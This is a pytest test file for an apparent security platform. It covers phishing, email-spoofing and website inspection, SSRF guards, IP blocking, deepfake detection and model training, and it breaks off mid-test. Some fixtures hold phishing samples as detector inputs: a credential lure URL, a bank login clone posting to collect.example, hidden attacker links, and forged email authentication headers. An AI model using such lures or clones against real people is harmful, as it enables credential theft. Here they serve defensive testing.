import asyncio
import io
import json
import sqlite3
import sys
import types

import pytest
import numpy as np
import main
from fastapi import HTTPException, UploadFile

from main import (
    admin_users,
    analyze_file,
    analyze_website,
    analyze_threat,
    compliance_controls,
    dashboard_metrics,
    get_db,
    summarize_dashboard_targets,
    initialize_database,
    incident_context,
    incident_detail,
    login,
    notifications,
    threat_intel_lookup,
    incident_genome,
    incident_correlations,
    incident_attack_chain,
    threat_forecast,
    incident_simulation,
    siem_ingest_event,
    read_siem_events,
    siem_demo_seed,
    idp_authenticate_user,
    adversarial_self_test,
    fatigue_routing,
    incident_intent,
    incident_drift,
    incident_memory,
    incident_explainability,
    alert_quality,
    alert_quality_record,
    record_alert_outcome,
    roadmap_immunity_publish,
    roadmap_counterfactual,
    roadmap_compliance_diff,
    roadmap_compliance_diff_sync,
    create_provider_ticket_route,
    disable_provider_identity_route,
    isolate_provider_endpoint_route,
    system_health,
)
from database import PostgresConnection, _postgresql_statement
from ephemeral_store import EphemeralStore
from cloudflare_waf import block_ip as cloudflare_block_ip
from production_integrations import IntegrationNotConfigured, create_ticket as create_production_ticket
from playbook_engine import load_playbooks, plan_playbook
from email_authenticity import analyze_eml, verify_sender_identity
from deepfake_models import _is_suspicious_label, _prepare_audio_waveform
from evaluate_media_dataset import calculate_metrics as calculate_media_metrics
from media_engine import media_inspection_status
from evaluate_public_datasets import evaluate as evaluate_public_text_dataset
import detection_engine
import geoip_enrichment
import malware_scanner
import deepfake_models
from campaign_engine import correlate_incident
from train_model import DEFAULT_DATASET, train as train_text_model
import website_inspector
from extended_intel import scan_payload
from models import ForecastRequest, LoginRequest, SimulationRequest, ThreatAnalysisRequest, ThreatIntelLookup
from models import ProviderEndpointIsolationRequest, ProviderIdentityDisableRequest, ProviderTicketRequest
from roadmap_features import analyst_bias_report, attention_heatmap, attacker_resource_cost, breach_economics, compliance_diff, counterfactual_replay, cross_modal_consistency, jurisdiction_route, seed_honeytokens, shared_immunity, supply_chain_blast_radius
from prevention_engine import (
    campaign_aware_prevention,
    containment_action_plan,
    cross_channel_prevention_score,
    deception_trigger_check,
    identity_trust_evaluation,
    insider_threat_risk,
    policy_aware_prevention,
    risk_aware_prevention_decision,
)
from threat_fusion import compute_drift_snapshot, detect_memory_hits, generate_attacker_intent
from account_rescue_engine import consent_record, contact_warning_draft, execute_step, fleet_summary, provider_capabilities, rescue_plan, rescue_report, rescue_simulation, scan_account
from regional_scam_detector import analyze_regional_scam


def test_core_operator_workflow():
    initialize_database()
    lead = login(LoginRequest(username="lead", password="lead123"))["user"]
    result = analyze_threat(
        ThreatAnalysisRequest(
            category="email",
            payload="URGENT verify credentials at http://bput-results.xyz from attacker@example.com",
        ),
        lead,
    )
    assert result["status"] == "success"
    assert result["assessment"]["risk_level"] in {"High", "Critical"}
    assert result["assessment"]["iocs"]
    assert incident_detail(result["incident_id"], lead)["incident"]["actions"] == []
    assert notifications(lead)["unread"] >= 0
    assert dashboard_metrics(lead)["totalEvents"] >= 1


def test_database_adapter_selects_postgresql_from_environment(monkeypatch):
    sentinel = object()
    monkeypatch.setenv("CYBERGUARD_DATABASE_URL", "postgresql://user:pass@localhost/cyberguard")
    monkeypatch.setattr("database.PostgresConnection", lambda url: (url, sentinel))

    connection = get_db()

    assert connection == ("postgresql://user:pass@localhost/cyberguard", sentinel)


def test_ephemeral_store_expires_challenges_and_tracks_atomic_operations():
    clock = [1_000.0]
    store = EphemeralStore(clock=lambda: clock[0])
    store.set("passkey:one", {"challenge": b"nonce", "expires_at": 1_030}, ttl_seconds=30)
    assert store.get("passkey:one")["challenge"] == b"nonce"
    assert store.pop("passkey:one")["challenge"] == b"nonce"
    assert store.pop("passkey:one") is None

    store.set("otp:one", {"otp_hash": "digest", "attempts": 0, "expires_at": 1_030}, ttl_seconds=30)
    assert store.increment_field("otp:one", "attempts") == 1
    assert store.increment_field("otp:one", "attempts") == 2
    assert store.pop_if("otp:one", "otp_hash", "wrong") is None
    assert store.pop_if("otp:one", "otp_hash", "digest")["attempts"] == 2

    assert store.record_window_event("security:ip", 1_000, 60) == 1
    assert store.record_window_event("security:ip", 1_030, 60) == 2
    assert store.record_window_event("security:ip", 1_061, 60) == 2

    store.set("short-lived", {"value": True}, ttl_seconds=2)
    clock[0] += 3
    assert store.get("short-lived") is None


def test_ephemeral_store_redis_operations_use_atomic_scripts():
    class RedisDouble:
        def __init__(self):
            self.values = {}
            self.sorted_sets = {}

        def set(self, key, value, ex=None):
            self.values[key] = value.encode() if isinstance(value, str) else value

        def get(self, key):
            return self.values.get(key)

        def eval(self, script, key_count, key, *args):
            raw = self.values.get(key)
            if "ZREMRANGEBYSCORE" in script:
                now, window, member = float(args[0]), float(args[1]), args[2]
                events = self.sorted_sets.setdefault(key, {})
                self.sorted_sets[key] = {name: score for name, score in events.items() if score > now - window}
                self.sorted_sets[key][member] = now
                return len(self.sorted_sets[key])
            if "tostring(value[ARGV[1]])" in script:
                if raw is None:
                    return None
                value = json.loads(raw)
                if str(value.get(args[0])) != args[1]:
                    return None
                return self.values.pop(key)
            if "value[ARGV[1]] =" in script:
                if raw is None:
                    return None
                value = json.loads(raw)
                value[args[0]] = int(value.get(args[0], 0)) + 1
                self.values[key] = json.dumps(value).encode()
                return value[args[0]]
            if "redis.call('DEL', KEYS[1])" in script:
                return self.values.pop(key, None)
            raise AssertionError("Unexpected Redis script")

    redis_double = RedisDouble()
    store = EphemeralStore(redis_client=redis_double, clock=lambda: 1_000.0)
    store.set("passkey:redis", {"challenge": b"nonce", "expires_at": 1_030}, ttl_seconds=30)
    assert store.get("passkey:redis")["challenge"] == b"nonce"
    assert store.pop("passkey:redis")["challenge"] == b"nonce"

    store.set("otp:redis", {"otp_hash": "digest", "attempts": 0}, ttl_seconds=30)
    assert store.increment_field("otp:redis", "attempts") == 1
    assert store.pop_if("otp:redis", "otp_hash", "digest")["attempts"] == 1

    assert store.record_window_event("security:redis", 1_000, 60) == 1
    assert store.record_window_event("security:redis", 1_030, 60) == 2


def test_ephemeral_store_requires_redis_in_production_and_selects_configured_client(monkeypatch):
    monkeypatch.setenv("CYBERGUARD_ENV", "production")
    monkeypatch.delenv("CYBERGUARD_REDIS_URL", raising=False)
    with pytest.raises(RuntimeError, match="required in production"):
        EphemeralStore.from_environment()

    class RedisClient:
        def ping(self):
            return True

    client = RedisClient()
    redis_module = types.ModuleType("redis")
    redis_module.RedisError = type("RedisError", (Exception,), {})
    redis_module.Redis = types.SimpleNamespace(from_url=lambda url, **kwargs: client)
    monkeypatch.setitem(sys.modules, "redis", redis_module)
    monkeypatch.setenv("CYBERGUARD_REDIS_URL", "redis://redis:6379/0")

    store = EphemeralStore.from_environment()

    assert store.backend == "redis"


def test_system_health_reports_ephemeral_state_backend():
    initialize_database()
    health = system_health({"username": "lead", "role": "lead"})

    assert health["ephemeral_state"] in {"redis", "process-local-memory"}


def test_cloudflare_block_validates_and_normalizes_ip_before_calling_provider(monkeypatch):
    monkeypatch.setenv("CLOUDFLARE_API_TOKEN", "test-token")
    monkeypatch.setenv("CLOUDFLARE_ZONE_ID", "test-zone")
    captured = {}

    class Response:
        def raise_for_status(self):
            return None

        def json(self):
            return {"success": True, "result": {"id": "rule-1"}}

    def fake_post(url, **kwargs):
        captured.update({"url": url, **kwargs})
        return Response()

    monkeypatch.setattr("cloudflare_waf.requests.post", fake_post)
    result = cloudflare_block_ip(" 2001:0db8::1 ", "incident containment")

    assert result["status"] == "blocked"
    assert result["ip_address"] == "2001:db8::1"
    assert captured["json"]["configuration"]["value"] == "2001:db8::1"
    with pytest.raises(ValueError, match="valid IPv4 or IPv6"):
        cloudflare_block_ip("not-an-ip", "invalid target")


def test_cloudflare_block_rejects_provider_success_false(monkeypatch):
    monkeypatch.setenv("CLOUDFLARE_API_TOKEN", "test-token")
    monkeypatch.setenv("CLOUDFLARE_ZONE_ID", "test-zone")

    class Response:
        def raise_for_status(self):
            return None

        def json(self):
            return {"success": False, "errors": [{"message": "denied"}]}

    monkeypatch.setattr("cloudflare_waf.requests.post", lambda *args, **kwargs: Response())
    with pytest.raises(RuntimeError, match="denied"):
        cloudflare_block_ip("192.0.2.10", "test containment")


def test_provider_action_routes_require_confirmation_and_return_provider_status(monkeypatch):
    admin = {"username": "root@example.org", "role": "head_admin"}
    monkeypatch.setattr("main.create_provider_ticket", lambda payload: {"provider": "jira", "status": "created", "result": {"key": "SEC-1"}})
    monkeypatch.setattr("main.disable_provider_identity", lambda identity: {"provider": "okta", "status": "suspended", "identity": identity})
    monkeypatch.setattr("main.isolate_provider_endpoint", lambda endpoint_id: {"provider": "edr", "status": "isolated", "endpoint_id": endpoint_id})

    assert create_provider_ticket_route(ProviderTicketRequest(summary="Investigation"), admin)["status"] == "created"
    with pytest.raises(HTTPException) as identity_error:
        disable_provider_identity_route(ProviderIdentityDisableRequest(identity="user-1"), admin)
    assert identity_error.value.status_code == 409
    with pytest.raises(HTTPException) as endpoint_error:
        isolate_provider_endpoint_route(ProviderEndpointIsolationRequest(endpoint_id="host-1"), admin)
    assert endpoint_error.value.status_code == 409
    assert disable_provider_identity_route(ProviderIdentityDisableRequest(identity="user-1", confirmed=True), admin)["status"] == "suspended"
    assert isolate_provider_endpoint_route(ProviderEndpointIsolationRequest(endpoint_id="host-1", confirmed=True), admin)["status"] == "isolated"


def test_jira_ticket_uses_api_token_basic_auth_and_requires_account_email(monkeypatch):
    monkeypatch.setenv("CYBERGUARD_JIRA_URL", "https://example.atlassian.net")
    monkeypatch.setenv("CYBERGUARD_JIRA_TOKEN", "api-token")
    monkeypatch.setenv("CYBERGUARD_JIRA_PROJECT", "SEC")
    monkeypatch.delenv("CYBERGUARD_JIRA_EMAIL", raising=False)
    with pytest.raises(IntegrationNotConfigured, match="CYBERGUARD_JIRA_EMAIL"):
        create_production_ticket({"summary": "Test issue"})

    monkeypatch.setenv("CYBERGUARD_JIRA_EMAIL", "soc@example.org")
    captured = {}

    class Response:
        content = b'{"key":"SEC-42"}'

        def raise_for_status(self):
            return None

        def json(self):
            return {"key": "SEC-42"}

    def fake_request(method, url, **kwargs):
        captured.update({"method": method, "url": url, **kwargs})
        return Response()

    monkeypatch.setattr("production_integrations.requests.request", fake_request)
    result = create_production_ticket({"summary": "Test issue"})

    assert result["status"] == "created"
    assert captured["url"] == "https://example.atlassian.net/rest/api/3/issue"
    assert captured["headers"]["Authorization"].startswith("Basic ")
    assert captured["json"]["fields"]["project"]["key"] == "SEC"


def test_website_inspector_rejects_non_global_dns_answers(monkeypatch):
    monkeypatch.setattr(website_inspector.socket, "getaddrinfo", lambda *args, **kwargs: [(None, None, None, None, ("100.64.0.1", 0))])

    with pytest.raises(ValueError, match="non-public network"):
        website_inspector._safe_addresses("public-looking.example")


def test_website_dom_identity_flags_branded_credential_clone():
    identity = website_inspector.analyze_page_identity(
        "https://account-verify.example/login",
        '<html><head><title>SBI Secure Login</title><meta property="og:site_name" content="SBI"></head>'
        '<body><img alt="SBI logo"><form action="https://collect.example/submit">'
        '<input type="password"></form></body></html>',
    )

    assert identity["credential_form"] is True
    assert identity["claimed_brands"] == ["sbi"]
    assert "sbi" in identity["brand_mismatches"]
    assert identity["cross_origin_form_actions"] == ["collect.example"]


def test_website_inspector_rechecks_redirect_targets_and_closes_streams(monkeypatch):
    requests_made = []

    class Response:
        is_redirect = True
        headers = {"location": "http://localhost/admin"}
        url = "https://public.example/"

        def __init__(self):
            self.closed = False

        def close(self):
            self.closed = True

    response = Response()

    class Session:
        def __init__(self):
            self.trust_env = True
            self.adapters = {"https://": types.SimpleNamespace(close=lambda: None), "http://": types.SimpleNamespace(close=lambda: None)}

        def mount(self, prefix, adapter):
            self.adapters[prefix] = adapter

        def get(self, url, **kwargs):
            requests_made.append(url)
            return response

        def close(self):
            self.closed = True

    session = Session()
    monkeypatch.setattr(website_inspector.requests, "Session", lambda: session)
    monkeypatch.setattr(website_inspector.socket, "getaddrinfo", lambda hostname, *args, **kwargs: [(None, None, None, None, ("93.184.216.34", 0))] if hostname == "public.example" else [(None, None, None, None, ("127.0.0.1", 0))])

    with pytest.raises(ValueError, match="non-public network"):
        website_inspector.inspect_website("https://public.example/")

    assert requests_made == ["https://public.example/"]
    assert response.closed is True
    assert session.closed is True


def test_website_inspector_accepts_public_page_and_closes_response(monkeypatch):
    class Response:
        is_redirect = False
        headers = {}
        url = "https://public.example/"
        status_code = 200
        encoding = "utf-8"
        closed = False

        def iter_content(self, chunk_size):
            yield b"<html><title>Safe page</title></html>"

        def close(self):
            self.closed = True

    response = Response()

    class Session:
        def __init__(self):
            self.adapters = {"https://": types.SimpleNamespace(close=lambda: None), "http://": types.SimpleNamespace(close=lambda: None)}

        def mount(self, prefix, adapter):
            self.adapters[prefix] = adapter

        def get(self, url, **kwargs):
            assert kwargs["allow_redirects"] is False
            return response

        def close(self):
            self.closed = True

    session = Session()
    monkeypatch.setattr(website_inspector.requests, "Session", lambda: session)
    monkeypatch.setattr(website_inspector.socket, "getaddrinfo", lambda *args, **kwargs: [(None, None, None, None, ("93.184.216.34", 0))])
    monkeypatch.setattr(website_inspector, "_certificate_details", lambda hostname, address, port: {"status": "verified", "verified": True, "issuer": "Test CA", "issued_at": "2026-01-01T00:00:00+00:00", "expires_at": "2026-10-01T00:00:00+00:00", "age_days": 272, "days_remaining": 1})
    monkeypatch.setattr(website_inspector, "_domain_registration", lambda domain: {"status": "available", "available": True, "registered_at": "2026-09-01T00:00:00+00:00", "age_days": 29})
    monkeypatch.setattr(website_inspector, "_certificate_transparency", lambda domain: {"status": "available", "available": True, "certificate_count": 2, "matching_names": [domain, f"www.{domain}"]})

    result = website_inspector.inspect_website("https://public.example/")

    assert result["title"] == "Safe page"
    assert result["tls_certificate"]["issuer"] == "Test CA"
    assert result["domain_registration"]["age_days"] == 29
    assert result["certificate_transparency"]["certificate_count"] == 2
    assert any("expires in 1 days" in finding for finding in result["findings"])
    assert any("registered recently" in finding for finding in result["findings"])
    assert response.closed is True
    assert session.closed is True


def test_website_enrichment_changes_assessment_risk(monkeypatch):
    monkeypatch.setattr("main.inspect_website", lambda url: {
        "final_url": url,
        "title": "Example",
        "findings": [],
        "tls_certificate": {"verified": True, "days_remaining": 7},
        "domain_registration": {"available": True, "age_days": 10},
    })
    monkeypatch.setattr("main.evaluate_threat_payload", lambda category, payload: {
        "risk_score": 10,
        "risk_level": "Safe",
        "indicators": [],
        "recommended_actions": [{"id": "warn_user", "label": "Warn"}],
        "xai_explanation": "Safe Risk: baseline.",
        "explanation_summary": "Baseline.",
    })
    monkeypatch.setattr("main.store_incident", lambda *args, **kwargs: 1)
    monkeypatch.setattr("main.persist_cyberguard_x", lambda *args, **kwargs: None)
    monkeypatch.setattr("main.write_audit", lambda *args, **kwargs: None)

    result = analyze_website({"url": "https://recent.example"}, {"username": "analyst"})

    assert result["assessment"]["risk_score"] == 55
    assert result["assessment"]["risk_level"] == "Medium"
    assert {item["name"] for item in result["assessment"]["indicators"]} == {"TLS Certificate Expiry", "Domain Registration Age"}
    assert "recent (10 days old)" in result["assessment"]["xai_explanation"]


def test_certificate_transparency_adapter_parses_names_and_rejects_redirects(monkeypatch):
    response_body = json.dumps([
        {"name_value": "example.com\nwww.example.com"},
        {"name_value": "unrelated.example.net"},
    ]).encode()
    captured = {}

    class Response:
        is_redirect = False

        def raise_for_status(self):
            return None

        def iter_content(self, chunk_size):
            yield response_body

        def close(self):
            return None

    class Session:
        trust_env = True

        def mount(self, prefix, adapter):
            return None

        def get(self, url, **kwargs):
            captured.update({"url": url, **kwargs})
            return Response()

        def close(self):
            return None

    monkeypatch.setattr(website_inspector, "CT_ENABLED", True)
    monkeypatch.setattr(website_inspector, "_safe_addresses", lambda hostname: ["93.184.216.34"])
    monkeypatch.setattr(website_inspector.requests, "Session", Session)

    result = website_inspector._certificate_transparency("example.com")

    assert result["status"] == "available"
    assert result["certificate_count"] == 2
    assert result["matching_names"] == ["example.com", "www.example.com"]
    assert captured["url"].startswith("https://crt.sh/")
    assert captured["allow_redirects"] is False

    class RedirectResponse(Response):
        is_redirect = True

    monkeypatch.setattr(Session, "get", lambda self, url, **kwargs: RedirectResponse())
    assert website_inspector._certificate_transparency("example.com")["status"] == "redirect_rejected"


def test_pinned_website_adapter_connects_to_resolved_ip_and_keeps_tls_hostname(monkeypatch):
    captured = {}
    adapter = website_inspector._PinnedAddressAdapter("public.example", "93.184.216.34", 443)

    class PoolManager:
        def connection_from_host(self, **kwargs):
            captured.update(kwargs)
            return "pinned-pool"

    adapter.poolmanager = PoolManager()
    request = website_inspector.requests.Request("GET", "https://public.example/path").prepare()

    assert adapter.get_connection_with_tls_context(request, verify=True) == "pinned-pool"
    assert captured["host"] == "93.184.216.34"
    assert captured["port"] == 443
    assert captured["pool_kwargs"]["assert_hostname"] == "public.example"
    assert captured["pool_kwargs"]["server_hostname"] == "public.example"

    monkeypatch.setattr(website_inspector.HTTPAdapter, "send", lambda self, prepared, **kwargs: prepared.headers.get("Host"))
    assert adapter.send(request) == "public.example"


def test_postgresql_sql_translation_preserves_insert_conflicts():
    assert _postgresql_statement("INSERT INTO users (username) VALUES (?)") == "INSERT INTO users (username) VALUES (%s)"
    assert _postgresql_statement("INSERT OR IGNORE INTO users (username) VALUES (?)") == "INSERT INTO users (username) VALUES (%s) ON CONFLICT DO NOTHING"
    assert _postgresql_statement("INSERT INTO blocked_ips (ip_address) VALUES (?) ON CONFLICT(ip_address) DO UPDATE SET ip_address = excluded.ip_address") == "INSERT INTO blocked_ips (ip_address) VALUES (%s) ON CONFLICT(ip_address) DO UPDATE SET ip_address = excluded.ip_address"


def test_postgresql_integrity_errors_match_existing_api_handling():
    class DatabaseConflict(Exception):
        pass

    class ConflictCursor:
        def execute(self, statement, parameters):
            raise DatabaseConflict("duplicate key")

    class ConflictConnection:
        def cursor(self):
            return ConflictCursor()

    connection = PostgresConnection.__new__(PostgresConnection)
    connection._integrity_error = DatabaseConflict
    connection._connection = ConflictConnection()

    with pytest.raises(sqlite3.IntegrityError, match="duplicate key"):
        connection.execute("INSERT INTO users (username) VALUES (?)")


def test_sender_identity_verification_checks_authentication_domain_alignment():
    aligned = verify_sender_identity(
        "Finance <alerts@bput.ac.in>",
        "alerts@bput.ac.in",
        "bounce@mailer.bput.ac.in",
        "mx; spf=pass smtp.mailfrom=mailer.bput.ac.in; dkim=pass header.d=bput.ac.in; dmarc=pass header.from=bput.ac.in",
        {"mx"},
    )
    spoofed = verify_sender_identity(
        "Finance <alerts@bput.ac.in>",
        "alerts@attacker.example",
        "bounce@attacker.example",
        "mx; spf=pass smtp.mailfrom=attacker.example; dkim=pass header.d=attacker.example; dmarc=pass header.from=attacker.example",
        {"mx"},
    )
    insufficient = verify_sender_identity("alerts@bput.ac.in", "", "", "")
    forged = verify_sender_identity(
        "alerts@bput.ac.in", "", "", "attacker.example; spf=pass smtp.mailfrom=bput.ac.in; dkim=pass header.d=bput.ac.in; dmarc=pass header.from=bput.ac.in", {"mx"}
    )

    assert aligned["status"] == "verified"
    assert aligned["risk_score"] < spoofed["risk_score"]
    assert spoofed["status"] == "mismatch"
    assert insufficient["status"] == "insufficient_evidence"
    assert forged["status"] == "untrusted_evidence"
    assert forged["risk_score"] > aligned["risk_score"]


def test_eml_analysis_exposes_sender_identity_assessment(monkeypatch):
    monkeypatch.setenv("CYBERGUARD_TRUSTED_AUTHSERV_IDS", "mx")
    result = analyze_eml(
        b"From: Finance <alerts@bput.ac.in>\r\n"
        b"Authentication-Results: mx; spf=pass smtp.mailfrom=bput.ac.in; dkim=pass header.d=bput.ac.in; dmarc=pass header.from=bput.ac.in\r\n"
        b"Subject: Account notice\r\n\r\nPlease review the account."
    )

    assert result["identity_verification"]["status"] == "verified"
    assert any(item["name"] == "Sender Identity Verification" for item in result["indicators"])


def test_eml_analysis_flags_hidden_links_iframes_and_external_forms():
    result = analyze_eml(
        b"From: alerts@bput.ac.in\r\n"
        b"MIME-Version: 1.0\r\n"
        b"Content-Type: text/html; charset=utf-8\r\n\r\n"
        b"<div style='display:none'><a href='https://login.attacker.example'>hidden</a></div>"
        b"<iframe src='https://frame.example'></iframe>"
        b"<form action='https://collect.example/submit'></form>"
    )

    inspection = result["html_inspection"]
    assert len(inspection["hidden_links"]) == 1
    assert len(inspection["iframes"]) == 1
    assert inspection["external_form_actions"] == ["https://collect.example/submit"]
    assert {indicator["name"] for indicator in result["indicators"]} >= {
        "Hidden Email Links",
        "Email HTML Iframes",
        "External Email Form Action",
    }


def test_pretrained_detector_maps_ai_voice_and_real_labels_correctly():
    assert _is_suspicious_label("AIVoice")
    assert _is_suspicious_label("AI-generated speech")
    assert _is_suspicious_label("Fake")
    assert not _is_suspicious_label("HumanVoice")
    assert not _is_suspicious_label("Real")


def test_media_status_distinguishes_cached_from_loaded_weights(monkeypatch, tmp_path):
    image_path = tmp_path / "image"
    audio_path = tmp_path / "audio"
    image_path.mkdir()
    audio_path.mkdir()
    (image_path / "model.safetensors").write_bytes(b"x" * 1_000_000)
    (audio_path / "model.safetensors").write_bytes(b"x" * 1_000_000)
    monkeypatch.setattr(deepfake_models, "_IMAGE_MODEL", str(image_path))
    monkeypatch.setattr(deepfake_models, "_AUDIO_MODEL", str(audio_path))
    monkeypatch.setattr(deepfake_models, "_PIPELINES", {})
    monkeypatch.setattr(deepfake_models, "_LOAD_ERRORS", {})
    monkeypatch.setenv("CYBERGUARD_ENABLE_PRETRAINED_MEDIA", "true")

    status = deepfake_models.model_status()

    assert status["mode"] == "pretrained-cached"
    assert status["weights_cached"] == {"image": True, "audio": True}
    assert status["loaded"] == []


def test_media_status_rejects_git_lfs_pointer_weights(monkeypatch, tmp_path):
    image_path = tmp_path / "image"
    audio_path = tmp_path / "audio"
    image_path.mkdir()
    audio_path.mkdir()
    (image_path / "model.safetensors").write_text("version https://git-lfs.github.com/spec/v1\noid sha256:test\nsize 1234567\n")
    monkeypatch.setattr(deepfake_models, "_IMAGE_MODEL", str(image_path))
    monkeypatch.setattr(deepfake_models, "_AUDIO_MODEL", str(audio_path))
    monkeypatch.setattr(deepfake_models, "_PIPELINES", {})
    monkeypatch.setattr(deepfake_models, "_LOAD_ERRORS", {})
    monkeypatch.setenv("CYBERGUARD_ENABLE_PRETRAINED_MEDIA", "true")

    status = deepfake_models.model_status()

    assert status["mode"] == "invalid-weights"
    assert status["weights_cached"] == {"image": False, "audio": False}
    assert status["weight_status"]["image"]["reason"] == "Git-LFS pointer"


def test_media_inspection_status_reflects_missing_heuristic_dependencies(monkeypatch):
    import media_engine
    monkeypatch.setattr(media_engine, "np", None)
    monkeypatch.setattr(media_engine, "IsolationForest", None)

    status = media_inspection_status()

    assert status["available"] is False
    assert status["mode"] == "limited-fallback"
    assert status["dependencies"]["numpy"] is False


def test_pretrained_audio_input_is_downmixed_and_resampled():
    time = np.arange(44100, dtype=np.float32) / 44100
    stereo = np.column_stack((np.sin(2 * np.pi * 440 * time), np.sin(2 * np.pi * 440 * time)))

    mono, sample_rate = _prepare_audio_waveform(stereo, 44100, 16000)

    assert sample_rate == 16000
    assert mono.ndim == 1
    assert abs(len(mono) - 16000) <= 1


def test_media_engine_decodes_flac_audio(monkeypatch):
    soundfile = pytest.importorskip("soundfile")
    import media_engine
    import deepfake_models

    monkeypatch.setattr(deepfake_models, "analyze_pretrained", lambda content, kind: None)
    waveform = np.column_stack((np.zeros(4410), np.zeros(4410))).astype(np.float32)
    audio = io.BytesIO()
    soundfile.write(audio, waveform, 44100, format="FLAC")

    result = media_engine.analyze_media(audio.getvalue(), "application/octet-stream", "voice.flac", "audio")

    assert result["method"] == "audio-anomaly-model"
    assert any("44100 Hz" in reason for reason in result["reasons"])


def test_media_evaluation_reports_rank_and_threshold_metrics():
    metrics = calculate_media_metrics([
        {"label": 0, "score": 10},
        {"label": 0, "score": 80},
        {"label": 1, "score": 60},
        {"label": 1, "score": 90},
    ])

    assert metrics["confusion_matrix"] == {"tn": 1, "fp": 1, "fn": 0, "tp": 2}
    assert metrics["precision"] == pytest.approx(2 / 3)
    assert metrics["recall"] == 1
    assert metrics["f1"] == pytest.approx(0.8)
    assert metrics["roc_auc"] == pytest.approx(0.75)
    assert metrics["pr_auc"] == pytest.approx(5 / 6)


def test_media_evaluation_rejects_single_class_or_invalid_threshold():
    with pytest.raises(ValueError, match="both real and fake"):
        calculate_media_metrics([{"label": 0, "score": 5}])
    with pytest.raises(ValueError, match="between 0 and 100"):
        calculate_media_metrics([{"label": 0, "score": 5}, {"label": 1, "score": 90}], 101)


def test_public_text_evaluation_reports_real_latency_percentiles_and_threshold(tmp_path):
    pytest.importorskip("sklearn")
    dataset = tmp_path / "text.csv"
    dataset.write_text(
        "text,label\n" + "".join(f"normal campus announcement number {index},0\n" for index in range(20))
        + "".join(f"urgent prize claim verify account number {index},1\n" for index in range(20)),
        encoding="utf-8",
    )

    result = evaluate_public_text_dataset(dataset, threshold=40)

    assert result["decision_threshold"] == 40
    assert result["fit_time_ms"] >= 0
    assert result["median_latency_ms_per_sample"] >= 0
    assert result["p95_latency_ms_per_sample"] >= result["median_latency_ms_per_sample"]
    with pytest.raises(ValueError, match="between 0 and 100"):
        evaluate_public_text_dataset(dataset, threshold=101)


def test_text_model_risk_gate_uses_configured_confidence_threshold(monkeypatch):
    monkeypatch.setattr(detection_engine, "model_signal", lambda payload: (55, {"name": "test model", "score": "55%"}))
    monkeypatch.setattr(detection_engine, "TEXT_MODEL_THRESHOLD", 50)
    enabled = detection_engine.evaluate_threat_payload("email", "A routine note")
    monkeypatch.setattr(detection_engine, "TEXT_MODEL_THRESHOLD", 60)
    gated = detection_engine.evaluate_threat_payload("email", "A routine note")

    assert enabled["risk_score"] == 55
    assert gated["risk_score"] == 5


def test_text_training_defaults_to_uci_and_saves_a_usable_artifact(tmp_path):
    assert DEFAULT_DATASET.name == "uci_sms_spam.csv"
    dataset = tmp_path / "messages.csv"
    rows = [
        *[(f"normal campus notice benignword{index}", 0) for index in range(20)],
        *[(f"urgent prize claim verify account spamword{index}", 1) for index in range(20)],
    ]
    dataset.write_text("text,label\n" + "".join(f"{text},{label}\n" for text, label in rows), encoding="utf-8")
    from sklearn.model_selection import train_test_split

    train_texts, holdout_texts, _, _ = train_test_split(
        [text for text, _ in rows],
        [label for _, label in rows],
        test_size=0.25,
        random_state=42,
        stratify=[label for _, label in rows],
    )
    model_path = tmp_path / "model.joblib"
    metrics_path = tmp_path / "metrics.json"

    model = train_text_model(dataset, model_path, metrics_path)
    metrics = json.loads(metrics_path.read_text(encoding="utf-8"))
    vocabulary = model.named_steps["tfidf"].vocabulary_

    assert model_path.exists()
    assert metrics["artifact_is_holdout_evaluated"] is True
    assert metrics["holdout_reused_for_artifact_training"] is False
    assert metrics["artifact_training_samples"] == len(train_texts)
    assert metrics["evaluation_holdout_samples"] == len(holdout_texts)
    assert all(text.split()[-1] not in vocabulary for text in holdout_texts)
    assert model.predict_proba(["urgent verify account"])[0][1] > model.predict_proba(["normal campus notice"])[0][1]


def test_trained_text_model_explains_local_linear_features_without_raw_identifiers(monkeypatch, tmp_path):
    pytest.importorskip("sklearn")
    dataset = tmp_path / "explainable-messages.csv"
    dataset.write_text(
        "text,label\n"
        + "".join(f"normal campus notice routineword{index},0\n" for index in range(20))
        + "".join(f"urgent verify credentials threatword{index},1\n" for index in range(20)),
        encoding="utf-8",
    )
    model = train_text_model(dataset, tmp_path / "explainable-model.joblib")
    monkeypatch.setattr(detection_engine, "TEXT_MODEL", model)
    monkeypatch.setattr(detection_engine, "FALLBACK_TEXT_MODEL", None)

    score, indicator = detection_engine.model_signal(
        "urgent verify credentials threatword3 contact analyst@example.test at 203.0.113.5"
    )
    attribution = indicator["feature_attribution"]

    assert 0 <= score <= 100
    assert attribution["status"] == "available"
    assert attribution["method"] == "tfidf_logistic_logit_contribution"
    assert any(feature["effect"] == "suspicious" for feature in attribution["features"])
    serialized = json.dumps(attribution)
    assert "analyst@example.test" not in serialized
    assert "203.0.113.5" not in serialized


def test_flower_client_redacts_local_data_and_requires_both_labels(tmp_path):
    pytest.importorskip("flwr")
    from flower_federated import load_local_dataset

    dataset = tmp_path / "client.csv"
    dataset.write_text(
        "text,label\nContact alice@example.org with code 12345678,1\nNormal campus notice,0\n",
        encoding="utf-8",
    )
    texts, labels = load_local_dataset(dataset)

    assert "alice@example.org" not in texts[0]
    assert "12345678" not in texts[0]
    assert set(labels.tolist()) == {0, 1}

    invalid_dataset = tmp_path / "invalid.csv"
    invalid_dataset.write_text("text,label\nMessage,1\n", encoding="utf-8")
    with pytest.raises(ValueError, match="both benign"):
        load_local_dataset(invalid_dataset)


def test_flower_entrypoints_forward_network_addresses(monkeypatch, tmp_path):
    pytest.importorskip("flwr")
    import flower_federated as flower

    server_call = {}
    monkeypatch.setattr(flower.fl.server, "start_server", lambda **kwargs: server_call.update(kwargs))
    with pytest.raises(ValueError, match="require TLS certificates"):
        flower.start_server(2, "0.0.0.0:9010", 2)
    certificate_paths = [tmp_path / "ca.pem", tmp_path / "server.pem", tmp_path / "server-key.pem"]
    for path, contents in zip(certificate_paths, (b"ca", b"server-cert", b"server-key")):
        path.write_bytes(contents)
    certificates = flower.load_server_certificates(*certificate_paths)
    with pytest.raises(ValueError, match="requires CA certificate"):
        flower.load_server_certificates(certificate_paths[0], None, certificate_paths[2])
    flower.start_server(2, "0.0.0.0:9010", 2, certificates)
    assert server_call["server_address"] == "0.0.0.0:9010"
    assert server_call["strategy"].min_available_clients == 2
    assert server_call["certificates"] == (b"ca", b"server-cert", b"server-key")

    dataset = tmp_path / "client.csv"
    dataset.write_text("text,label\nurgent payment,1\nnormal notice,0\n", encoding="utf-8")
    client_call = {}
